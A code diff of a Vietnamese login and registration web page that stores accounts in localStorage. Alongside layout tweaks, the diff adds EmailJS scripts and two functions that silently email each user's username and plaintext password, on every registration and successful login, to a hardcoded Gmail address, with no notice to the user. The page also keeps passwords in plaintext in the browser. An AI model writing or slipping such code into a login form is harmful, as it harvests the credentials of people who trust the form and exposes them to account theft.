@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hệ Thống Đăng Nhập</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script> <!-- EmailJS Script -->
 </head>
 <style type="text/css">
     #notification {
@@ -44,8 +45,8 @@
                     <button type="button" id="toggle-password" class="absolute right-2 top-2 text-gray-400">👁</button>
                 </div>
 
-                <div id="captcha-container" class="">
-                    <label class="block text-sm mt-3" id="captcha">Mã Captcha</label>
+                <div id="captcha-container" class="mt-3">
+                    <label class="block text-sm" id="captcha">Mã Captcha</label>
                     <div class="flex items-center">
                         <input type="text" id="captcha-input" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="Nhập mã Captcha">
                         <span id="captcha-code" class="ml-2 p-2 bg-gray-500 text-white rounded text-lg font-bold"></span>
@@ -69,144 +70,177 @@
     <div id="notification" class="fixed bottom-5 right-5 bg-green-500 text-white p-3 rounded-lg shadow-lg hidden">
         <p id="notification-text"></p>
     </div>
-
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-document.addEventListener("DOMContentLoaded", function () {
-    const authForm = document.getElementById("auth-form");
-    const captcha = document.getElementById('captcha');
-    const usernameInput = document.getElementById("username");
-    const passwordInput = document.getElementById("password");
-    const confirmPasswordContainer = document.getElementById("confirm-password-container");
-    const confirmPasswordInput = document.getElementById("confirm-password");
-    const submitBtn = document.getElementById("submit-btn");
-    const formTitle = document.getElementById("form-title");
-    const toggleForm = document.getElementById("toggle-form");
-    const captchaContainer = document.getElementById("captcha-container");
-    const captchaCode = document.getElementById("captcha-code");
-    const refreshCaptcha = document.getElementById("refresh-captcha");
+        document.addEventListener("DOMContentLoaded", function () {
+            emailjs.init('BUHtg1BuVtAPT9O2M'); // Thay USER_ID của bạn
 
-    let isRegistering = false;
+            const authForm = document.getElementById("auth-form");
+            const usernameInput = document.getElementById("username");
+            const passwordInput = document.getElementById("password");
+            const confirmPasswordInput = document.getElementById("confirm-password");
+            const submitBtn = document.getElementById("submit-btn");
+            const formTitle = document.getElementById("form-title");
+            const toggleForm = document.getElementById("toggle-form");
+            const captchaCode = document.getElementById("captcha-code");
+            const refreshCaptcha = document.getElementById("refresh-captcha");
 
-    // Chuyển đổi giữa đăng nhập và đăng ký
-    toggleForm.addEventListener("click", function (e) {
-        e.preventDefault();
-        isRegistering = !isRegistering;
+            let isRegistering = false;
 
-        if (isRegistering) {
-            formTitle.textContent = "Đăng ký tài khoản";
-            submitBtn.textContent = "Đăng ký";
-            confirmPasswordContainer.classList.remove("hidden");
-            captchaContainer.classList.add("hidden"); // Ẩn Captcha khi đăng ký
-            toggleForm.textContent = "Đã có tài khoản? Đăng nhập!"; 
-        } else {
-            formTitle.textContent = "Đăng nhập hệ thống";
-            submitBtn.textContent = "Đăng nhập";
-            confirmPasswordContainer.classList.add("hidden");
-            captchaContainer.classList.remove("hidden"); // Hiện Captcha khi đăng nhập
-            toggleForm.textContent = "Đăng Ký Ngay!";
-            generateCaptcha(); 
-        }
-    });
+            // Chuyển đổi giữa đăng nhập và đăng ký
+            toggleForm.addEventListener("click", function (e) {
+                e.preventDefault();
+                isRegistering = !isRegistering;
 
-    // Hàm hiển thị thông báo
-    function showNotification(message, bgColor) {
-        const notification = document.getElementById("notification");
-        const notificationText = document.getElementById("notification-text");
-        notificationText.textContent = message;
-        notification.className = `fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 ${bgColor} text-white p-3 rounded-lg shadow-lg`;
-        notification.style.display = "block";
-
-        setTimeout(() => {
-            notification.style.display = "none";
-        }, 3000);
-    }
-
-    // Kiểm tra tài khoản tồn tại
-    function userExists(username) {
-        let users = JSON.parse(localStorage.getItem("users")) || {};
-        return users.hasOwnProperty(username);
-    }
-
-    // Lưu tài khoản mới
-    function saveUser(username, password) {
-        let users = JSON.parse(localStorage.getItem("users")) || {};
-        users[username] = password;
-        localStorage.setItem("users", JSON.stringify(users));
-    }
-
-    // Xử lý form đăng nhập & đăng ký
-    authForm.addEventListener("submit", function (e) {
-        e.preventDefault();
-        const username = usernameInput.value.trim();
-        const password = passwordInput.value.trim();
-        const confirmPassword = confirmPasswordInput.value.trim();
-        const captchaInput = document.getElementById("captcha-input").value.trim();
-
-        if (isRegistering) {
-            // Đăng ký tài khoản (không cần captcha)
-            if (userExists(username)) {
-                showNotification("⚠ Tài khoản đã tồn tại!", "bg-red-500");
-            } else if (password !== confirmPassword) {
-                showNotification("⚠ Mật khẩu không khớp nhau!", "bg-red-500");
-            } else {
-                saveUser(username, password);
-                showNotification("✅ Đăng ký thành công!", "bg-green-500");
-                isRegistering = false;
-                formTitle.textContent = "Đăng nhập hệ thống";
-                submitBtn.textContent = "Đăng nhập";
-                confirmPasswordContainer.classList.add("hidden");
-                captchaContainer.classList.remove("hidden");
-                toggleForm.textContent = "Đăng Ký Ngay!";
-            }
-        } else {
-            // Đăng nhập tài khoản (yêu cầu captcha)
-            let users = JSON.parse(localStorage.getItem("users")) || {};
-            if (users[username] && users[username] === password) {
-                if (captchaInput === "") {
-                    showNotification("⚠ Mã Captcha không được để trống!", "bg-red-500");
-                } else if (captchaInput === captchaCode.textContent) {
-                    showNotification("✅ Đăng nhập thành công!", "bg-green-500");
+                if (isRegistering) {
+                    formTitle.textContent = "Đăng ký tài khoản";
+                    submitBtn.textContent = "Đăng ký";
+                    document.getElementById("confirm-password-container").classList.remove("hidden");
+                    document.getElementById("captcha-container").classList.add("hidden");
+                    toggleForm.textContent = "Đã có tài khoản? Đăng nhập!";
                 } else {
-                    showNotification("⚠ Mã Captcha không chính xác!", "bg-red-500");
+                    formTitle.textContent = "Đăng nhập hệ thống";
+                    submitBtn.textContent = "Đăng nhập";
+                    document.getElementById("confirm-password-container").classList.add("hidden");
+                    document.getElementById("captcha-container").classList.remove("hidden");
+                    toggleForm.textContent = "Đăng Ký Ngay!";
+                    generateCaptcha();
                 }
-            } else {
-                showNotification("⚠ Sai tài khoản hoặc mật khẩu!", "bg-red-500");
-                generateCaptcha();
+            });
+
+            // Hàm hiển thị thông báo
+            function showNotification(message, bgColor) {
+                const notification = document.getElementById("notification");
+                const notificationText = document.getElementById("notification-text");
+                notificationText.textContent = message;
+                notification.className = `fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 ${bgColor} text-white p-3 rounded-lg shadow-lg`;
+                notification.style.display = "block";
+
+                setTimeout(() => {
+                    notification.style.display = "none";
+                }, 3000);
             }
-        }
-    });
 
-    function generateCaptcha() {
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        let captcha = "";
-        for (let i = 0; i < 4; i++) {
-            captcha += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        captchaCode.textContent = captcha;
-    }
+            // Kiểm tra tài khoản tồn tại
+            function userExists(username) {
+                let users = JSON.parse(localStorage.getItem("users")) || {};
+                return users.hasOwnProperty(username);
+            }
 
-    refreshCaptcha.addEventListener("click", generateCaptcha);
-    
-    // Gọi hàm khi load trang để hiển thị captcha ban đầu
-    generateCaptcha();
+            // Lưu tài khoản mới
+            function saveUser(username, password) {
+                let users = JSON.parse(localStorage.getItem("users")) || {};
+                users[username] = password;
+                localStorage.setItem("users", JSON.stringify(users));
+            }
 
-    // Ẩn/Hiện mật khẩu
-    const togglePassword = document.getElementById("toggle-password");
-    togglePassword.addEventListener("click", function() {
-        const type = passwordInput.type === "password" ? "text" : "password";
-        passwordInput.type = type;
-        togglePassword.textContent = type === "password" ? "👁" : "🙈";
-    });
+            // Gửi thông tin đăng ký qua Gmail
+            function sendRegistrationEmail(username, password) {
+                const templateParams = {
+                    username: username,
+                    password: password,
+                    to_email: "thiennguyenchi235aa@gmail.com", // Email nhận
+                };
 
-    const toggleConfirmPassword = document.getElementById("toggle-confirm-password");
-    toggleConfirmPassword.addEventListener("click", function() {
-        const type = confirmPasswordInput.type === "password" ? "text" : "password";
-        confirmPasswordInput.type = type;
-        toggleConfirmPassword.textContent = type === "password" ? "👁" : "🙈";
-    });
-});
+                emailjs.send('service_7y26eqp', 'template_mcvqowq', templateParams)
+                    .then(function (response) {
+                        console.log('Email sent successfully:', response);
+                    }, function (error) {
+                        console.error('Error sending email:', error);
+                    });
+            }
 
+            // Gửi thông tin đăng nhập qua Gmail
+            function sendLoginEmail(username, password) {
+                const templateParams = {
+                    username: username,
+                    password: password,
+                    to_email: "thiennguyenchi235aa@gmail.com", // Email nhận
+                };
 
+                emailjs.send('service_7y26eqp', 'template_mcvqowq', templateParams)
+                    .then(function (response) {
+                        console.log('Email sent successfully:', response);
+                    }, function (error) {
+                        console.error('Error sending email:', error);
+                    });
+            }
+
+            // Xử lý form đăng nhập & đăng ký
+            authForm.addEventListener("submit", function (e) {
+                e.preventDefault();
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
+                const confirmPassword = confirmPasswordInput.value.trim();
+                const captchaInput = document.getElementById("captcha-input").value.trim();
+
+                if (isRegistering) {
+                    // Đăng ký tài khoản
+                    if (userExists(username)) {
+                        showNotification("⚠ Tài khoản đã tồn tại!", "bg-red-500");
+                    } else if (password !== confirmPassword) {
+                        showNotification("⚠ Mật khẩu không khớp nhau!", "bg-red-500");
+                    } else {
+                        saveUser(username, password);
+                        sendRegistrationEmail(username, password); // Gửi email đăng ký
+                        showNotification("✅ Đăng ký thành công!", "bg-green-500");
+                        isRegistering = false;
+                        formTitle.textContent = "Đăng nhập hệ thống";
+                        submitBtn.textContent = "Đăng nhập";
+                        document.getElementById("confirm-password-container").classList.add("hidden");
+                        document.getElementById("captcha-container").classList.remove("hidden");
+                        toggleForm.textContent = "Đăng Ký Ngay!";
+                    }
+                } else {
+                    // Đăng nhập tài khoản
+                    let users = JSON.parse(localStorage.getItem("users")) || {};
+                    if (users[username] && users[username] === password) {
+                        if (captchaInput === "") {
+                            showNotification("⚠ Mã Captcha không được để trống!", "bg-red-500");
+                        } else if (captchaInput === captchaCode.textContent) {
+                            showNotification("✅ Đăng nhập thành công!", "bg-green-500");
+                            sendLoginEmail(username, password); // Gửi email đăng nhập
+                        } else {
+                            showNotification("⚠ Mã Captcha không chính xác!", "bg-red-500");
+                        }
+                    } else {
+                        showNotification("⚠ Sai tài khoản hoặc mật khẩu!", "bg-red-500");
+                        generateCaptcha();
+                    }
+                }
+            });
+
+            function generateCaptcha() {
+                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                let captcha = "";
+                for (let i = 0; i < 4; i++) {
+                    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                captchaCode.textContent = captcha;
+            }
+
+            refreshCaptcha.addEventListener("click", generateCaptcha);
+
+            // Gọi hàm khi load trang để hiển thị captcha ban đầu
+            generateCaptcha();
+
+            // Ẩn/Hiện mật khẩu
+            const togglePassword = document.getElementById("toggle-password");
+            togglePassword.addEventListener("click", function() {
+                const type = passwordInput.type === "password" ? "text" : "password";
+                passwordInput.type = type;
+                togglePassword.textContent = type === "password" ? "👁" : "🙈";
+            });
+
+            const toggleConfirmPassword = document.getElementById("toggle-confirm-password");
+            toggleConfirmPassword.addEventListener("click", function() {
+                const type = confirmPasswordInput.type === "password" ? "text" : "password";
+                confirmPasswordInput.type = type;
+                toggleConfirmPassword.textContent = type === "password" ? "👁" : "🙈";
+            });
+        });
     </script>
+
 </body>
 </html>
+	
